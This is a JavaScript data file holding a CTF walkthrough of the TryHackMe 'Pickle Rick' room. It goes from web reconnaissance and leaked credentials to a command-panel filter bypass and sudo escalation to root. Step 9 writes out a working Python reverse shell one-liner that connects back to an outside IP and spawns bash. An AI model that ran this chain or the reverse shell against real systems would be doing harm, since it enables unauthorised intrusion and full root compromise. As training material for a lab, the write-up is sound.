// Pickle Rick (TryHackMe). Flags/answers are hidden (blurred in screenshots); IPs are left as they were.
import { term, fig, why, step } from "../helpers.mjs";

const T = { who: "shell", host: "ip-10-49-167-173" };   // the reverse shell on the target
const K = { cwd: "~/THM/pickle-rick" };                 // my machine

export default {
  slug: "pickle-rick",
  title: "Pickle Rick",
  platform: "TryHackMe",
  diff: "easy",
  os: "Linux · Web",
  date: "2026-11-23",
  room: "https://tryhackme.com/room/picklerick",
  tools: ["nmap", "gobuster", "curl", "DevTools", "revshells.com", "netcat"],
  tags: ["web", "source-code", "command-injection", "reverse-shell", "sudo"],
  path: ["HTML comment (user)", "robots.txt (password)", "command panel", "Python reverse shell", "sudo NOPASSWD ALL", "root"],
  summary: "Pickle Rick is a small Linux web box. The site leaks a username in an HTML comment and a password in <code>robots.txt</code>. After login, a command panel runs shell commands as <code>www-data</code> but blocks <code>cat</code>, so I turn it into a reverse shell. For the last ingredient, <code>www-data</code> can run any command as root with no password.",
  description: "TryHackMe Pickle Rick walkthrough: HTML comment and robots.txt credentials, a filtered web command panel turned into a Python reverse shell, and sudo NOPASSWD to root.",
  banner: "/images/pickle-rick/room.png",
  sections: [
    { id: "q1", h: "Q1. What is the first ingredient?", body:
      step(1, "Scan all ports",
        term({ ...K, cmds: ["nmap -sVC -p- -Pn -T4 rick.thm"], out:
`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
<span class="hl">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
|_http-title: Rick is sup4r cool` }) +
        "<p>Only SSH and a web server are open. I have no credentials for SSH, so I start with the website.</p>") +

      step(2, "Read the home page source",
        "<p>The page says Rick forgot his password. I open DevTools and find an HTML comment at the bottom of the page with a username.</p>" +
        fig("/images/pickle-rick/html-comment.png", "DevTools: the username is left in a comment.")) +

      step(3, "Brute-force directories and files",
        term({ ...K, cmds: [
`gobuster dir -u http://rick.thm \\
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
  -x php,txt,js,bak,html`], out:
`index.html   (Status: 200) [Size: 1062]
<span class="hl">login.php    (Status: 200) [Size: 882]</span>
assets       (Status: 301) [--> http://rick.thm/assets/]
portal.php   (Status: 302) [--> /login.php]
<span class="hl">robots.txt   (Status: 200) [Size: 17]</span>` }) +
        "<p><code>login.php</code> is the login page, and <code>portal.php</code> sends me back to it, so it needs a session.</p>") +

      step(4, "Read robots.txt",
        term({ ...K, cmds: ["curl http://rick.thm/robots.txt"], out: "Wubbalubbadubdub" }) +
        "<p>No paths, just one odd word. I keep it as a password guess.</p>") +

      step(5, "Log in and test the command panel",
        "<p>I log in at <code>login.php</code> with <code>R1ckRul3s</code> / <code>Wubbalubbadubdub</code>. It opens <code>portal.php</code>, a \"Command Panel\". I run <code>whoami</code> first.</p>" +
        fig("/images/pickle-rick/panel-whoami.png", "The panel runs my command as www-data.") +
        "<p>The answer is <code>www-data</code>, so I can run commands on the server.</p>") +

      step(6, "List the web root",
        "<p>I run <code>ls -la</code> in the panel.</p>" +
        fig("/images/pickle-rick/panel-ls.png", "The first ingredient file and clue.txt sit in the web root.")) +

      step(7, "Try to read the files (dead end)",
        "<p>I try <code>cat Sup3rS3cretPickl3Ingred.txt</code> and <code>cat clue.txt</code>.</p>" +
        fig("/images/pickle-rick/panel-cat-disabled.png", "\"Command disabled\": the panel blocks cat.") +
        "<p>The panel filters <code>cat</code>, so I need a real shell.</p>") +

      step(8, "Check for Python",
        term({ who: "panel", cmds: ["which python3"], out: "/usr/bin/python3" }) +
        "<p>Python 3 is installed, so a Python reverse shell will work.</p>") +

      step(9, "Start a listener and send a reverse shell",
        "<p>On my machine I start a listener:</p>" +
        term({ root: true, cwd: "/home/…/Desktop/Study/THM/Pickle_Rick_writeups", cmds: ["nc -lvnp 1234"] }) +
        "<p>In the command panel I send a Python reverse shell (revshells.com, Python3 #2):</p>" +
        term({ who: "panel", wrap: true, cmds: [`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.189",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'`] }) +
        fig("/images/pickle-rick/reverse-shell.png", "The listener catches the shell. whoami: www-data.") +
        why("The filter only checks the text typed into the panel. Python is not blocked, and it opens a socket to me with bash attached. In that shell there is no filter, so <code>cat</code> works again.")) +

      step(10, "Read the first ingredient",
        term({ ...T, cwd: "/var/www/html", cmds: ["cat Sup3rS3cretPickl3Ingred.txt"] }) +
        fig("/images/pickle-rick/ingredient-1.png", "First ingredient (answer blurred)."))
    },

    { id: "q2", h: "Q2. What is the second ingredient?", body:
      step(1, "Read the clue",
        term({ ...T, cwd: "/var/www/html", cmds: ["cat clue.txt"] }) +
        fig("/images/pickle-rick/clue.png", "The clue points to the file system.")) +

      step(2, "Look in the home folders",
        term({ ...T, cmds: [["cd /", "/var/www/html"], ["ls", "/"], ["cd home", "/"], ["ls", "/home"], ["cd rick", "/home"], ["ls", "/home/rick"]] }) +
        fig("/images/pickle-rick/home-folders.png", "Two users, rick and ubuntu. Rick's home has one file with a space in its name.")) +

      step(3, "Read the file with quotes",
        term({ ...T, cwd: "/home/rick", cmds: ["cat second ingredients", "cat 'second ingredients'"] }) +
        fig("/images/pickle-rick/ingredient-2.png", "Without quotes it fails; with quotes it works (answer blurred).") +
        "<p>Without quotes, bash splits the name into two files and both fail. With quotes it works.</p>")
    },

    { id: "q3", h: "Q3. What is the last ingredient?", body:
      step(1, "Try to open /root",
        term({ ...T, cwd: "/", cmds: ["pwd", "ls -l", "cd root"] }) +
        fig("/images/pickle-rick/root-denied.png", "/root is drwx------ (root only): Permission denied.") +
        "<p>The last ingredient is probably in <code>/root</code>, and only root can open it.</p>") +

      step(2, "Check SUID sudo (dead end)",
        term({ ...T, cwd: "/", cmds: ["find / -perm -4000 2>/dev/null | grep sudo"], out:
`/snap/core/17200/usr/bin/sudo
/snap/core20/2318/usr/bin/sudo
/snap/core18/2829/usr/bin/sudo
/usr/bin/sudo` }) +
        "<p>The three <code>/snap</code> copies come from read-only snap images and are normal. SUID on sudo is normal too, so this tells me nothing about my sudo rights.</p>") +

      step(3, "List my sudo rights",
        term({ ...T, cwd: "/", cmds: ["sudo -l"] }) +
        fig("/images/pickle-rick/sudo-l.png", "(ALL) NOPASSWD: ALL") +
        "<p><code>www-data</code> can run any command as root with no password.</p>" +
        why("sudo follows the sudoers rules, not the file permissions. A <code>NOPASSWD: ALL</code> rule for the web user means any command injection on the site is already full root.")) +

      step(4, "Read /root with sudo",
        term({ ...T, cwd: "/", cmds: ["sudo ls -la /root", "sudo cat /root/3rd.txt"] }) +
        fig("/images/pickle-rick/ingredient-3.png", "3rd.txt read as root (answer blurred)."))
    }
  ]
};
